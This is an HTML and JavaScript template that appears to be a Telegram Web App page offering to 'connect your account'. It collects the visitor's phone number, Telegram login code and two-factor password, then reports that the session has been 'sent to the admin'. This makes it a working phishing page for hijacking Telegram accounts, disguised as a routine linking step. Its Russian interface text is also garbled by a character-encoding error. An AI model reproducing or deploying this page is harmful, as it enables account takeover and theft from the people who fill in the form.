<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∞–∫–∫–∞—É–Ω—Ç–∞</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            color: #fff;
            font-family: 'Arial', sans-serif;
            overflow-x: hidden;
            min-height: 100vh;
        }
        
        .background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 80%, rgba(41, 196, 255, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255, 196, 41, 0.1) 0%, transparent 50%);
            animation: backgroundMove 20s infinite linear;
        }
        
        .dots {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                radial-gradient(#fff 1px, transparent 1px);
            background-size: 50px 50px;
            animation: dotsMove 30s infinite linear;
        }
        
        .container {
            position: relative;
            z-index: 10;
            max-width: 400px;
            margin: 50px auto;
            padding: 30px;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #ccc;
        }
        
        input {
            width: 100%;
            padding: 12px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
        }
        
        input:focus {
            outline: none;
            border-color: #0088cc;
        }
        
        .btn {
            width: 100%;
            padding: 12px;
            background: #0088cc;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s ease;
        }
        
        .btn:hover {
            background: #0066aa;
        }
        
        .btn:disabled {
            background: #555;
            cursor: not-allowed;
        }
        
        .step {
            display: none;
        }
        
        .step.active {
            display: block;
        }
        
        .back-btn {
            background: transparent;
            border: 1px solid #555;
            margin-top: 10px;
        }
        
        .back-btn:hover {
            background: rgba(255,255,255,0.1);
        }
        
        .status {
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            text-align: center;
        }
        
        .status.success {
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #0f0;
        }
        
        .status.error {
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid #f00;
        }
    </style>
</head>
<body>
    <div class="background"></div>
    <div class="dots"></div>
    
    <div class="container">
        <h2 style="text-align: center; margin-bottom: 30px;">üîó –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∞–∫–∫–∞—É–Ω—Ç–∞</h2>
        
        <!-- –®–∞–≥ 1: –í–≤–æ–¥ –Ω–æ–º–µ—Ä–∞ -->
        <div id="step-phone" class="step active">
            <div class="form-group">
                <label for="phone">–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</label>
                <input type="text" id="phone" placeholder="+79123456789" required>
            </div>
            <button class="btn" onclick="sendCode()">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥</button>
        </div>
        
        <!-- –®–∞–≥ 2: –í–≤–æ–¥ –∫–æ–¥–∞ -->
        <div id="step-code" class="step">
            <div class="form-group">
                <label for="code">–ö–æ–¥ –∏–∑ Telegram:</label>
                <input type="text" id="code" placeholder="12345" required>
            </div>
            <button class="btn" onclick="verifyCode()">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
            <button class="btn back-btn" onclick="backToPhone()">–ù–∞–∑–∞–¥</button>
        </div>
        
        <!-- –®–∞–≥ 3: –í–≤–æ–¥ –ø–∞—Ä–æ–ª—è (–µ—Å–ª–∏ –Ω—É–∂–Ω–æ) -->
        <div id="step-password" class="step">
            <div class="form-group">
                <label for="password">–ü–∞—Ä–æ–ª—å 2FA:</label>
                <input type="password" id="password" placeholder="–í–∞—à –ø–∞—Ä–æ–ª—å" required>
            </div>
            <button class="btn" onclick="verifyPassword()">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
            <button class="btn back-btn" onclick="backToCode()">–ù–∞–∑–∞–¥</button>
        </div>
        
        <!-- –°—Ç–∞—Ç—É—Å -->
        <div id="status"></div>
    </div>

    <script>
        const user_id = "{{ user_id }}";
        
        function showStep(stepId) {
            document.querySelectorAll('.step').forEach(step => {
                step.classList.remove('active');
            });
            document.getElementById(stepId).classList.add('active');
        }
        
        function showStatus(message, type) {
            const statusDiv = document.getElementById('status');
            statusDiv.innerHTML = message;
            statusDiv.className = `status ${type}`;
        }
        
        function clearStatus() {
            document.getElementById('status').innerHTML = '';
            document.getElementById('status').className = 'status';
        }
        
        async function sendCode() {
            const phone = document.getElementById('phone').value;
            if (!phone) {
                showStatus('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞', 'error');
                return;
            }
            
            clearStatus();
            showStatus('–û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞...', '');
            
            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        phone: phone,
                        user_id: user_id
                    })
                });
                
                const data = await response.json();
                
                if (data.status === 'success') {
                    showStep('step-code');
                    showStatus('–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! –ü—Ä–æ–≤–µ—Ä—å—Ç–µ Telegram.', 'success');
                } else {
                    showStatus('–û—à–∏–±–∫–∞: ' + data.message, 'error');
                }
            } catch (error) {
                showStatus('–û—à–∏–±–∫–∞ —Å–µ—Ç–∏', 'error');
            }
        }
        
        async function verifyCode() {
            const code = document.getElementById('code').value;
            if (!code) {
                showStatus('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥', 'error');
                return;
            }
            
            clearStatus();
            showStatus('–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–¥–∞...', '');
            
            try {
                const response = await fetch('/api/verify', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        code: code
                    })
                });
                
                const data = await response.json();
                
                if (data.status === 'success') {
                    showStatus('‚úÖ –ê–∫–∫–∞—É–Ω—Ç —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω! –°–µ—Å—Å–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –∞–¥–º–∏–Ω—É.', 'success');
                    setTimeout(() => {
                        if (window.TelegramWebApp) {
                            window.TelegramWebApp.close();
                        }
                    }, 3000);
                } else if (data.status === 'need_password') {
                    showStep('step-password');
                    showStatus('–¢—Ä–µ–±—É–µ—Ç—Å—è –ø–∞—Ä–æ–ª—å –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏', '');
                } else {
                    showStatus('–û—à–∏–±–∫–∞: ' + data.message, 'error');
                }
            } catch (error) {
                showStatus('–û—à–∏–±–∫–∞ —Å–µ—Ç–∏', 'error');
            }
        }
        
        async function verifyPassword() {
            const password = document.getElementById('password').value;
            if (!password) {
                showStatus('–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å', 'error');
                return;
            }
            
            clearStatus();
            showStatus('–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è...', '');
            
            try {
                const response = await fetch('/api/verify', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        code: document.getElementById('code').value,
                        password: password
                    })
                });
                
                const data = await response.json();
                
                if (data.status === 'success') {
                    showStatus('‚úÖ –ê–∫–∫–∞—É–Ω—Ç —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω! –°–µ—Å—Å–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –∞–¥–º–∏–Ω—É.', 'success');
                    setTimeout(() => {
                        if (window.TelegramWebApp) {
                            window.TelegramWebApp.close();
                        }
                    }, 3000);
                } else {
                    showStatus('–û—à–∏–±–∫–∞: ' + data.message, 'error');
                }
            } catch (error) {
                showStatus('–û—à–∏–±–∫–∞ —Å–µ—Ç–∏', 'error');
            }
        }
        
        function backToPhone() {
            showStep('step-phone');
            clearStatus();
        }
        
        function backToCode() {
            showStep('step-code');
            clearStatus();
        }
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram Web App
        if (window.TelegramWebApp) {
            TelegramWebApp.ready();
            TelegramWebApp.expand();
        }
    </script>
</body>
</html>
